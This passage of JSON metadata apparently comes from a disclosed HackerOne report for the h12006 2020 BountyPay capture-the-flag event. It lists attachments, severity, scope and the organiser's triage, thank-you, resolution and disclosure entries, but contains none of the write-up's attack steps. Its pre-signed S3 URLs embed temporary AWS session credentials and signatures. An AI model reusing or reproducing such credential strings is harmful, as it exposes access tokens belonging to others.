QqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026X-Amz-Signature=de444a494dfdca6f913e3eea28dedfe859b2e1ecac559ba7a8c7050792184971","file_size":29131,"type":"image/png"},{"id":859504,"file_name":"Screenshot_from_2020-06-09_00-07-18.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hws3ehRBmJhJHBxZ4rkU6v6s?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_00-07-18.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_00-07-18.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070729Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026X-Amz-Signature=bf3dc97ec9b8abefd26527c37b65b2c9906c31370722cd9948408128976355b1","file_size":30086,"type":"image/png"},{"id":859521,"file_name":"Screenshot_from_2020-06-09_00-22-24.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iN7hZGUJz8C2otZQdHxiXeFP?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_00-22-24.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_00-22-24.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070729Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026X-Amz-Signature=d84c4120aaa7057e6a9c6754c3f2793e92f1da0e95c7dd3462763a10c707fbd9","file_size":90123,"type":"image/png"},{"id":859556,"file_name":"BountyPay.apk","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vYLRoViQdgeoVx21eJrRW7By?response-content-disposition=attachment%3B%20filename%3D%22BountyPay.apk%22%3B%20filename%2A%3DUTF-8%27%27BountyPay.apk\u0026response-content-type=application%2Fvnd.android.package-archive\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070729Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026X-Amz-Signature=17adceaeed48b0c53b31b3af70bcb24e831f4a22e6ab7f5275cc883078f6a477","file_size":4043701,"type":"application/vnd.android.package-archive"},{"id":859607,"file_name":"andriod_challenges_solved.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7KoKF8X2ygkv7xPfyLHzfZzm?response-content-disposition=attachment%3B%20filename%3D%22andriod_challenges_solved.jpg%22%3B%20filename%2A%3DUTF-8%27%27andriod_challenges_solved.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070729Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026X-Amz-Signature=2cbe08bdffb2eed11d1b035b38d023fc0b109f5662e7a11f74bded2fb9f816c2","file_size":26815,"type":"image/jpeg"},{"id":859634,"file_name":"sandra_first_day_pic.jpeg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gnXm85KUyZpNCRnvnqKkP5an?response-content-disposition=attachment%3B%20filename%3D%22sandra_first_day_pic.jpeg%22%3B%20filename%2A%3DUTF-8%27%27sandra_first_day_pic.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070729Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026X-Amz-Signature=1906e25d8a3bb973b516ed14d4a7f96db244aae5dd85900a54fe25667b4238d3","file_size":267755,"type":"image/jpeg"},{"id":859704,"file_name":"Screenshot_from_2020-06-09_02-26-29.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QeusQjsiMjrKuAkrStnGJfDZ?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-06-09_02-26-29.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-06-09_02-26-29.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070729Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026X-Amz-Signature=430816d2282b60032eb1ceaa851eee9ef9f9cf3f31f0f4013a1064e0c50f9a8a","file_size":26243,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-18T02:34:23.630Z","allow_singular_disclosure_after":-14185985.79089774,"singular_disclosure_allowed":true,"vote_count":5,"voters":["nytr0gen","brahim_boufakri01","d1r3wolf","tecnical_nitish","supervegeta"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8237016,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:47:21.732Z","updated_at":"2020-06-08T21:47:21.732Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268322,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\u003c/p\u003e\n\n\u003cp\u003eWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we\u0026#39;ll make sure to let you know when you can publish them on your site!\u003c/p\u003e\n\n\u003cp\u003eIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-11T23:03:12.621Z","updated_at":"2020-06-11T23:03:12.621Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324963,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","markdown_message":"\u003cp\u003eThank you again for participating in the #h12006 CTF! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T22:28:12.040Z","updated_at":"2020-06-17T22:28:12.040Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"d1r3wolf","url":"/d1r3wolf"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8326506,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T02:34:23.607Z","updated_at":"2020-06-18T02:34:23.607Z","first_to_agree":true,"actor":{"username":"d1r3wolf","cleared":false,"url":"/d1r3wolf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/v3k5gr6QFfVf4pGryaVXyw3p/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8332784,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T15:28:49.434Z","updated_at":"2020-06-18T15:28:49.434Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8332785,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T15:28:49.528Z","updated_at":"2020-06-18T15:28:49.528Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}